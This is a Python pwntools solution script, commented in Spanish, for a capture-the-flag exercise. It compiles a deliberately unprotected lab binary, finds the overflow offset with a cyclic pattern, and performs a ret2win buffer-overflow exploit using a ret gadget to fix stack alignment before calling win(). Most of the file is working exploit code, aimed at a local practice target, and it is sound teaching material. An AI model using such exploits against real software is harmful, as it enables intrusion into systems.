#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CTF-01 - "La bóveda olvidada": ret2win con trampa de alineación.
Diagnóstico: No canary, No PIE, NX, gets() en victima(), win() existe.
Razonamiento: rellenar hasta el retorno y apuntar a win(); printf dentro
de win() exige pila alineada a 16 (movaps): si saltas directo, la pila
queda desalineada y muere dentro de printf. Un gadget ret extra delante
de win() re-alinea. TODO dinámico: elf.symbols + find_gadget.
USO: python3 sol_ctf01.py"""
from pwn import *
import os

context.arch = 'amd64'
context.log_level = 'info'

BIN = './ctf01'
FLAG_DEMO = 'FLAG{CTF01_alineacion_clasica}'

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-o', BIN, 'ctf01.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

# flag.txt de práctica: solo si no existe (no pisa la tuya)
if not os.path.exists('flag.txt'):
    with open('flag.txt', 'w') as f:
        f.write(FLAG_DEMO + '\n')
    log.info('flag.txt de práctica creado')

elf = ELF(BIN, checksec=False)   # símbolos dinámicos: nada hardcodeado
win = elf.symbols['win']
log.info('win() vive en %#x (de ESTA compilación; la tuya será distinta)', win)

# ------------------------------------------------------------------
# FASE 1 - offset dinámico: patrón cíclico + corefile (método A2)
# ------------------------------------------------------------------
io = process(BIN)
io.recvuntil(b'escribe tu nombre')
io.sendline(cyclic(200))
io.wait()
try:
    core = io.corefile
    offset = cyclic_find(core.read(core.rsp, 4))   # x86_64: leer $rsp
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    offset = cyclic_find(core.read(core.rsp, 4))
io.close()
log.info('Offset medido en caliente: %d bytes (buffer 64 + RBP 8)', offset)

ret_gadget = ROP(elf).find_gadget(['ret'])[0]
log.info('Gadget de alineación: ret @ %#x', ret_gadget)

# ------------------------------------------------------------------
# FASE 2 - la trampa: saltar directo a win() SIN alinear la pila
# ------------------------------------------------------------------
log.info('Control negativo: padding + p64(win) sin ret extra...')
io = process(BIN)
io.recvuntil(b'escribe tu nombre')
io.sendline(b'A' * offset + p64(win))
salida = io.recvall(timeout=3)
io.wait()
if io.poll() == -signal.SIGSEGV and b'FLAG' not in salida:
    log.warning('Trampa confirmada: SIGSEGV dentro de printf (movaps '
                'exige pila alineada a 16).')
elif b'[win] FLAG:' in salida:
    log.info('Tu glibc no chocó con movaps en esta ruta; el ret extra '
             'sigue siendo la práctica correcta.')
io.close()

# ------------------------------------------------------------------
# FASE 3 - solución: un gadget ret extra re-alinea la pila
#   payload = 'A'*offset + p64(ret) + p64(win)
# ------------------------------------------------------------------
io = process(BIN)
io.recvuntil(b'escribe tu nombre')
payload = b'A' * offset + p64(ret_gadget) + p64(win)
assert b'\n' not in payload, 'gets() cortaría el payload en el primer 0x0a'
io.sendline(payload)
salida = io.recvall(timeout=3)
io.close()

if b'[win] FLAG:' in salida or FLAG_DEMO.encode() in salida:
    flag = salida[salida.find(b'FLAG:'):].split(b'\n')[0]
    log.success('CTF-01 SUPERADO: ret consumió su casilla y win() '
                'imprimió el secreto (%s) con la pila alineada.'
                % flag.decode('utf-8', 'replace'))
else:
    log.failure('CTF-01: sin flag. Repasa: offset con cyclic, win() con '
                'elf.symbols, ret de alineación y flag.txt junto al '
                'binario.')
